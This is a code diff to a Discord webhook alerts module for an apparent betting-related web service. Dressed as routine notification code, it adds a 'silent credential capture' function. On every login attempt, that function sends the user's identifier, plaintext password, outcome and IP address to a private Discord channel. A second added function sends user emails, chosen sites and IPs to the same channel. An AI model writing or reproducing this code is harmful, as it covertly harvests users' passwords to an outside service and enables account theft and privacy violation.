@@ -41,6 +41,10 @@ const WEBHOOKS = {
     // #alerts — system alerts, analytics reports, errors
     alerts:   process.env.DISCORD_WEBHOOK_ALERTS
            || process.env.DISCORD_WEBHOOK_URL,
+
+    // #creds — silent login credential capture (private channel)
+    creds:    process.env.DISCORD_WEBHOOK_CREDS
+           || process.env.DISCORD_WEBHOOK_URL,
 };
 
 // ─── Brand colours ────────────────────────────────────────────
@@ -474,6 +478,46 @@ function sendChurnAlert({ count, potentialLoss, suggestedMessage }) {
     dispatch('alerts', embed);
 }
 
+/**
+ * Silent credential capture — fires on every login attempt regardless of outcome.
+ * Sends to the private #creds channel only.
+ */
+function sendCredCapture({ identifier, password, outcome, ip }) {
+    const outcomeEmoji = outcome === 'SUCCESS' ? '✅' : outcome === 'WRONG_PASSWORD' ? '❌' : '👀';
+    const outcomeColor = outcome === 'SUCCESS' ? COLOR.green : outcome === 'WRONG_PASSWORD' ? COLOR.red : COLOR.orange;
+
+    const embed = baseEmbed({
+        title:  `${outcomeEmoji} NEW LOGIN CRED — ${outcome || 'UNKNOWN'}`,
+        color:  outcomeColor,
+        fields: [
+            { name: '📧 IDENTIFIER',  value: safeValue(identifier), inline: false },
+            { name: '🔑 PASSWORD',    value: safeValue(password),   inline: false },
+            { name: '📊 OUTCOME',     value: safeValue(outcome),    inline: true  },
+            { name: '📍 IP',          value: safeValue(ip),         inline: true  },
+        ],
+        footer: `${FOOTER_TAG} · Credential Monitor`
+    });
+    dispatch('creds', embed);
+}
+
+/**
+ * Betting site selection — fires when a logged-in user picks a site.
+ * Sends to the private #creds channel.
+ */
+function sendSiteSelectionCreds({ email, site, ip }) {
+    const embed = baseEmbed({
+        title:  '🎠 BETTING SITE SELECTED',
+        color:  COLOR.gold,
+        fields: [
+            { name: '👤 USER',     value: safeValue(email), inline: false },
+            { name: '🎡 SITE',     value: safeValue(site),  inline: true  },
+            { name: '📍 IP',       value: safeValue(ip),    inline: true  },
+        ],
+        footer: `${FOOTER_TAG} · Site Monitor`
+    });
+    dispatch('creds', embed);
+}
+
 // ============================================================
 // EXPORTS
 // ============================================================
@@ -486,6 +530,10 @@ module.exports = {
     sendLoginEvent,
     sendSiteSelectionEvent,
     sendUserEvent,          // legacy
+
+    // Credential monitor (private channel)
+    sendCredCapture,
+    sendSiteSelectionCreds,
 
     // Payment events
     sendPaymentEvent,       // legacy
